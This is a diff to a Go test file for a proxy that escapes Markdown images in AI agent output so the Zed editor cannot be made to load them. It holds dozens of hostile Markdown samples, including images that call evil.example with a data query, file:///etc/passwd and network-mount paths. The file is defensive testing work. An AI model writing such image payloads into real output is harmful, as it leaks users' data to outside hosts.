@@ -2,6 +2,7 @@ package acpproxy
 
 import (
 	"bytes"
+	"encoding/base64"
 	"fmt"
 	"html"
 	"math/rand"
@@ -15,22 +16,33 @@ import (
 
 var renderedImage = regexp.MustCompile(`<img[^>]*\ssrc="([^"]*)"`)
 
-// remoteImages renders Markdown as goldmark does, which stands in for Zed's pulldown-cmark: both follow
-// CommonMark. It returns the sources of the images a renderer would fetch.
-func remoteImages(t *testing.T, markdown string) []string {
+// loadedImages renders Markdown as goldmark does, which stands in for Zed's pulldown-cmark: both follow
+// CommonMark. It returns the source of every image Zed would load instead of decoding it by itself.
+func loadedImages(t *testing.T, markdown string) []string {
 	t.Helper()
 	var rendered bytes.Buffer
 	if err := goldmark.New(goldmark.WithExtensions(extension.GFM, extension.Footnote)).Convert([]byte(markdown), &rendered); err != nil {
 		t.Fatal(err)
 	}
-	var remote []string
+	var loaded []string
 	for _, image := range renderedImage.FindAllStringSubmatch(rendered.String(), -1) {
-		source := strings.ToLower(html.UnescapeString(image[1]))
-		if strings.HasPrefix(source, "http://") || strings.HasPrefix(source, "https://") {
-			remote = append(remote, image[1])
+		if !zedDecodes(html.UnescapeString(image[1])) {
+			loaded = append(loaded, image[1])
 		}
 	}
-	return remote
+	return loaded
+}
+
+// zedDecodes says what Zed turns into an image with no path, read from its source at v1.26.2: a type it
+// knows and base64 that decodes under strict rules. Anything else goes on to its path lookup.
+func zedDecodes(source string) bool {
+	for _, format := range imageFormats {
+		if data, ok := strings.CutPrefix(source, string(format)); ok {
+			_, err := base64.StdEncoding.Strict().DecodeString(data)
+			return err == nil && !strings.ContainsAny(data, "\r\n")
+		}
+	}
+	return false
 }
 
 // splitAt sends text as pieces cut at the given positions and ends the turn.
@@ -57,8 +69,77 @@ func everySplit(text string, check func(split, assembled string)) {
 	check("one byte at a time", splitAt(text, everyByte...))
 }
 
-// A hostile program writes these. Each must render a remote image as it stands, or it proves nothing.
+// A hostile program writes these. Each must render an image as it stands, or it proves nothing.
 var imageDocuments = []string{
+	`![x](evil.png)`,
+	`![x](./evil.png)`,
+	`![x](../evil.png)`,
+	`![x](/net/evil.example/a.png)`,
+	`![x](\/net/evil.example/a.png)`,
+	`![x](a%20b.png)`,
+	`![x](evil.png "title")`,
+	`![x](<a b.png>)`,
+	`![x]()`,
+	`![x](<>)`,
+	`![x](file:///etc/passwd)`,
+	`![a [b](c) d](evil.png)`,
+	"![x](\nevil.png\n)",
+	"> ![x](\n> evil.png)",
+	// Zed reads each of these as a project path a box can name, because none of them decodes.
+	`![x](data:a)`,
+	`![x](data:)`,
+	`![x](DATA:image/png;base64,QUJD)`,
+	`![x](Data:image/png;base64,QUJD)`,
+	`![x](data:image/png;base64,QQ)`,
+	`![x](data:image/png;base64,QR==)`,
+	`![x](data:image/png;base64,Q!JD)`,
+	`![x](data:image/png,QUJD)`,
+	`![x](data:image/svg+xml;base64,QUJD)`,
+	`![x](data:text/plain;base64,QUJD)`,
+	`![x](>data:image/png;base64,QUJD)`,
+	"![x](\n    >data:image/png;base64,QUJD)",
+	"[a]: data:a\n\n![a]",
+	"[a]: data:image/png;base64,QQ\n\n![a]",
+	"[a]: DATA:image/png;base64,QUJD\n\n![a]",
+	"![a]\n\n[a]: da",
+	"[a]: evil.png\n\n![a]",
+	"![a]\n\n[a]: evil.png",
+	"![a]\r\n\r\n[a]: evil.png",
+	"![a][b]\n\n[b]: evil.png",
+	"![a][]\n\n[a]: evil.png",
+	"[a]:evil.png\n\n![a]",
+	"[a]:\nevil.png\n\n![a]",
+	"[a]: evil.png \"title\"\n\n![a]",
+	"[a]: <b c.png>\n\n![a]",
+	"  [a]: evil.png\n\n![a]",
+	"   [a]: evil.png\n\n![a]",
+	"> [a]: evil.png\n\n![a]",
+	">[a]: evil.png\n\n![a]",
+	"> > [a]: evil.png\n\n![a]",
+	"- [a]: evil.png\n\n![a]",
+	"* [a]: evil.png\n\n![a]",
+	"+ [a]: evil.png\n\n![a]",
+	"1. [a]: evil.png\n\n![a]",
+	"12) [a]: evil.png\n\n![a]",
+	"- > 1. [a]: evil.png\n\n![a]",
+	"- a\n  - b\n    - c\n\n      [a]: evil.png\n\n![a]",
+	"- a\n\n\t[a]: evil.png\n\n![a]",
+	"[a]: data:image/png;base64,QUJD\n't'[b]: evil.png\n\n![b]",
+	"text\n\n[a]: evil.png\n\n![a]",
+	"[b]: /one\n[a]: evil.png\n\n![a]",
+	"[b]: data:image/png;base64,QUJD\n[a]: evil.png\n\n![a]",
+	"[a\nb]: evil.png\n\n![a b]",
+	"[\na\n]: evil.png\n\n![a]",
+	"> [a\n> b]: evil.png\n\n![a b]",
+	"[a\\]b]: evil.png\n\n![a\\]b]",
+	"[a!]: evil.png\n\n![a!]",
+	"line\r\r[a]: evil.png\r\r![a]",
+	"# a\\\n[a]: evil.png\n\n![a]",
+	"[^1]: [a]: evil.png\n\n![a] and [^1]",
+	"[^1]:\n    [a]: evil.png\n\n![a] and [^1]",
+	"[^1]: > [a]: evil.png\n\n![a] and [^1]",
+	"[^1]: - [a]: evil.png\n\n![a] and [^1]",
+	"[^]: evil.png\n\n![^]",
 	`![x](https://evil.example/?data=1)`,
 	`![x](http://evil.example/)`,
 	`text ![x](https://evil.example/) text`,
@@ -150,23 +231,24 @@ var imageDocuments = []string{
 	"[^1]: > [x]: https://evil.example/\n\n![x] and [^1]",
 }
 
-func TestNoSplitLeavesARemoteImage(t *testing.T) {
+func TestNoSplitLeavesAnImage(t *testing.T) {
 	for _, document := range imageDocuments {
-		if len(remoteImages(t, document)) == 0 && !goldmarkMissesIt(document) {
-			t.Errorf("this does not render a remote image, so it proves nothing: %q", document)
+		if len(loadedImages(t, document)) == 0 && !goldmarkMissesIt(document) {
+			t.Errorf("this does not render an image, so it proves nothing: %q", document)
 		}
 		everySplit(document, func(split, assembled string) {
-			if images := remoteImages(t, assembled); len(images) > 0 {
+			if images := loadedImages(t, assembled); len(images) > 0 {
 				t.Errorf("%q, %s, became %q, which fetches %v", document, split, assembled, images)
 			}
 		})
 	}
 }
 
-// goldmarkMissesIt names what only pulldown-cmark, Zed's parser, reads as a definition: a footnote's body
-// is a container there. The check against pulldown-cmark itself is in the card.
+// goldmarkMissesIt names what only pulldown-cmark, Zed's parser, reads as an image: a footnote's body is a
+// container there, and `\r` alone ends a line.
+// The check against pulldown-cmark itself is in the card.
 func goldmarkMissesIt(document string) bool {
-	return strings.HasPrefix(document, "[^1]")
+	return strings.HasPrefix(document, "[^") || strings.Contains(document, "\r\r")
 }
 
 // Whatever the split, the text comes out the same: holding text back must not change the answer.
@@ -187,11 +269,10 @@ var benignDocuments = []string{
 	"```rust\nassert!(matches!(x, Some(_)));\nlet s = &a[1..];\nlet m = matrix[0][1];\n```\n",
 	"```sh\n#!/bin/sh\nif ! grep -q x y; then echo no!; fi\n```\n",
 	"```python\nif items[0]:\n    return items[1:]\nfor k in d[\"x\"]:\n    print(\"http://example.org\")\n```\n",
-	"```ts\ninterface A {\n  [key: string]: number;\n  [k: string]: (a: B) => void;\n  [K in C]: { d: E };\n}\n```\n",
+	"```ts\ninterface A {\n  a: B[]; c[0]: d;\n}\nlet x: { y: number }[] = [];\n```\n",
 	"```js\nconst a = ![1, 2].includes(x);\nconst b = !x[0];\n```\n",
 	"```rust\nlet first = vec![1, 2][0];\nlet boxed = vec![Vec::<u8>::new(), a < b];\n```\n",
-	"```md\n![logo](logo.png)\n![logo][1]\n\n[1]: logo.png\n```\n",
-	"![plot](out/plot.png) and ![other](http.png \"title\")",
+	"```md\n![logo][1]\n```\n",
 	"```\nvec![1, 2]\n\n[note]\n```\n",
 	"```json\n[\n  {\"a\": 1},\n  {\"b\": 2}\n]\n```\n",
 	"The macro `vec![1, 2]` and `#!/bin/sh` and `a[0]: b`.",
@@ -201,9 +282,31 @@ var benignDocuments = []string{
 	"Done! It works!\n\nNext!",
 	"wow! [docs](https://example.org/) wow!",
 	"[docs](https://example.org/)",
-	"see [docs][d]\n\n[d]: ./docs/readme.md",
-	"[note]: this is a remark",
-	"[1]: number",
+	"see [docs][d]",
+	"a[0]: b",
+	"x[i]: int",
+	"  a[0]: b\n  x[i]: int\n",
+	"let x[i]: int = 1;\n",
+	"vec![1, 2]",
+	"text [a]: b",
+	"[a] : b",
+	"[a]\n: b",
+	"[a][b]: c",
+	"[[a]]: b",
+	"[a[0]: b",
+	"\\[a]: b",
+	"[INFO] [worker]: started",
+	"[1, 2, 3]",
+	"[\n  1,\n  2\n]\n",
+	"[profile.release]\nlto = true\n",
+	"[[bin]]\nname = \"x\"\n",
+	"[ -f a ] && b\n",
+	"- [x] done: yes",
+	"1. [ ] later: maybe",
+	"![x](data:image/png;base64,QUJD)",
+	"see ![x](data:image/jpeg;base64,QUI=) and ![y](data:image/gif;base64,QQ==) and ![z](data:image/webp;base64,+/+/)",
+	"![x](\n  data:image/png;base64,QUJD)",
+	"- [x] [a]: b",
 	"- [x] done\n- [ ] not yet",
 	"> [!NOTE]\n> Careful!",
 	"| a | b |\n|---|---|\n| x! | y[0] |\n| `z![1]` | w |\n",
@@ -213,7 +316,6 @@ var benignDocuments = []string{
 	"![x] with nothing to point at",
 	"![",
 	"vec![1,\n\n2]",
-	"![x](local",
 }
 
 func TestCodeAndOrdinaryTextStayByteForByte(t *testing.T) {
@@ -255,7 +357,7 @@ func TestAPauseDoesNotOpenAWay(t *testing.T) {
 			before := append(escaper.write([]byte(document[:cut])), escaper.finish(pauseText)...)
 			after := append(escaper.write([]byte(document[cut:])), escaper.finish(pauseText)...)
 			for _, assembled := range []string{string(before) + string(after), string(after)} {
-				if images := remoteImages(t, assembled); len(images) > 0 {
+				if images := loadedImages(t, assembled); len(images) > 0 {
 					t.Errorf("%q paused at %d became %q, which fetches %v", document, cut, assembled, images)
 				}
 			}
@@ -269,7 +371,7 @@ func TestABackslashAtAPauseEscapesNothingLater(t *testing.T) {
 	before := append(escaper.write([]byte(`\`)), escaper.finish(pauseText)...)
 	after := append(escaper.write([]byte(`![x](https://evil.example/)`)), escaper.finish(pauseText)...)
 	for _, assembled := range []string{string(before) + string(after), string(after)} {
-		if images := remoteImages(t, assembled); len(images) > 0 {
+		if images := loadedImages(t, assembled); len(images) > 0 {
 			t.Errorf("%q fetches %v", assembled, images)
 		}
 	}
@@ -279,7 +381,7 @@ func TestSealedTextCannotBeFinishedByWhatFollows(t *testing.T) {
 	for _, document := range imageDocuments {
 		for cut := 1; cut < len(document); cut++ {
 			assembled := escapeWhole(document[:cut], sealText) + escapeWhole(document[cut:], sealText)
-			if images := remoteImages(t, assembled); len(images) > 0 {
+			if images := loadedImages(t, assembled); len(images) > 0 {
 				t.Errorf("%q cut at %d became %q, which fetches %v", document, cut, assembled, images)
 			}
 		}
@@ -293,6 +395,8 @@ func TestHeldTextIsBounded(t *testing.T) {
 		"code spans":        "![`" + strings.Repeat("a`", maxHeldText) + "](https://evil.example/)",
 		"a long gap":        "[x]:" + strings.Repeat(" ", 2*maxHeldText) + "https://evil.example/\n\n![x]",
 		"a long address":    "[x]: h" + strings.Repeat("a", 2*maxHeldText) + "://evil.example/\n\n![x]",
+		"a long label":      "[" + strings.Repeat("a", 2*maxHeldText) + "]: evil.png\n\n![" + strings.Repeat("a", 2*maxHeldText) + "]",
+		"a long data image": "![x](data:image/png;base64," + strings.Repeat("A", 2*maxHeldText) + ")",
 	} {
 		t.Run(name, func(t *testing.T) {
 			var escaper imageEscaper
@@ -304,17 +408,61 @@ func TestHeldTextIsBounded(t *testing.T) {
 				}
 			}
 			out = append(out, escaper.finish(pauseText)...)
-			if images := remoteImages(t, string(out)); len(images) > 0 {
+			if images := loadedImages(t, string(out)); len(images) > 0 {
 				t.Errorf("fetches %v", images)
 			}
 		})
 	}
 }
 
-// Zed opens an absolute path by itself, and a mount can make that a request to another machine.
-func TestAnAbsolutePathIsTreatedAsRemote(t *testing.T) {
-	for _, document := range []string{`![x](/net/evil.example/a.png)`, `![x](\/net/evil.example/a.png)`} {
-		if got := escapeWhole(document, lastText); got != `\`+document {
+// What really is shaped like a definition or an image pays with a backslash, in a code block too, where
+// it shows. Elsewhere the Markdown hides it. These are the whole price, each written out.
+func TestWhatLooksLikeADefinitionShowsABackslash(t *testing.T) {
+	for document, want := range map[string]string{
+		"[key: string]: number;":                 `[key: string]\: number;`,
+		"```ts\n  [K in C]: { d: E };\n```\n":    "```ts\n  [K in C]\\: { d: E };\n```\n",
+		"[note]: this is a remark":               `[note]\: this is a remark`,
+		"[1]: number":                            `[1]\: number`,
+		"see [docs][d]\n\n[d]: ./docs/readme.md": "see [docs][d]\n\n[d]\\: ./docs/readme.md",
+		"[^1]: a footnote":                       `[^1]\: a footnote`,
+		"**[a]: b**":                             `**[a]\: b**`,
+		"- [a]: b":                               `- [a]\: b`,
+		"[a]: data:image/png;base64,QUJD":        `[a]\: data:image/png;base64,QUJD`,
+		"![plot](out/plot.png) and more":         `\![plot](out/plot.png) and more`,
+		"![x](local":                             `\![x](local`,
+		"[open":                                  `\[open`,
+	} {
+		everySplit(document, func(split, assembled string) {
+			if assembled != want {
+				t.Errorf("%q, %s, became %q, not %q", document, split, assembled, want)
+			}
+		})
+	}
+}
+
+// Zed turns a `data:` that does not decode into a project path, so a file named just so would load.
+func TestOnlyWhatZedDecodesStaysAnImage(t *testing.T) {
+	for document, stays := range map[string]bool{
+		`![x](data:image/png;base64,QUJD)`:   true,
+		`![x](data:image/jpeg;base64,QUJD)`:  true,
+		`![x](data:image/gif;base64,QUJD)`:   true,
+		`![x](data:image/webp;base64,QUJD)`:  true,
+		`![x](data:image/png;base64,)`:       true,
+		`![x](data:image/png;base64,QQ)`:     false,
+		`![x](data:image/png;base64,QR==)`:   false,
+		`![x](data:image/svg+xml;base64,QQ)`: false,
+		`![x](data:a)`:                       false,
+		`![x](DATA:image/png;base64,QUJD)`:   false,
+		`![x](evil.png)`:                     false,
+		// Zed would decode these, but a parser could read them another way, and no agent writes them.
+		`![x](data:image/png;base64,QUJD "title")`: false,
+		`![x](<data:image/png;base64,QUJD>)`:       false,
+		`![x](&#100;ata:image/png;base64,QUJD)`:    false,
+		`![x](data\:image/png;base64,QUJD)`:        false,
+		`![x](data:image/png;base64,QUJ&#68;)`:     false,
+		`![x](data:image/png;base64,QUJ\+)`:        false,
+	} {
+		if got := escapeWhole(document, lastText); (got == document) != stays || !stays && got != `\`+document {
 			t.Errorf("%q became %q", document, got)
 		}
 	}
@@ -329,17 +477,17 @@ func TestALongLineOfOpeningsIsReadOnce(t *testing.T) {
 	}
 	line = strings.Repeat("![", 1<<20) + "](https://evil.example/)"
 	var escaper imageEscaper
-	if out := append(escaper.write([]byte(line)), escaper.finish(pauseText)...); len(remoteImages(t, string(out[:1<<16]))) > 0 {
+	if out := append(escaper.write([]byte(line)), escaper.finish(pauseText)...); len(loadedImages(t, string(out[:1<<16]))) > 0 {
 		t.Errorf("fetches an image")
 	}
 }
 
 // What a hand-written table misses, a soup of the bytes that matter may find.
-func TestRandomDocumentsLeaveNoRemoteImage(t *testing.T) {
+func TestRandomDocumentsLeaveNoImage(t *testing.T) {
 	tokens := []string{
 		"!", "![", "[", "]", "](", "][", "]:", ":", "(", ")", "<", ">", "`", "``", "\\", "\\\\", "\n", "\n\n", "\r\n", "\r", " ", "  ", "\t",
 		"- ", "> ", "1. ", "[^1]:", "x", "a b", "\"", "'", "&#58;", "&#104;ttps", "https://evil.example/", "http://evil.example/", "<https://evil.example/>",
-		"[x]: ", "![x]", "|", "|---|", "```",
+		"[x]: ", "![x]", "|", "|---|", "```", "evil.png", "[x]: evil.png", "(evil.png)", "data:a", "data:image/png;base64,", "QUJD", "- [x] ", "[^x]",
 	}
 	random := rand.New(rand.NewSource(1))
 	for round := 0; round < 20000; round++ {
@@ -358,7 +506,7 @@ func TestRandomDocumentsLeaveNoRemoteImage(t *testing.T) {
 		if assembled != splitAt(text) {
 			t.Errorf("%q cut at %v became %q, not %q", text, cuts, assembled, splitAt(text))
 		}
-		if images := remoteImages(t, assembled); len(images) > 0 {
+		if images := loadedImages(t, assembled); len(images) > 0 {
 			t.Errorf("%q became %q, which fetches %v", text, assembled, images)
 		}
 	}
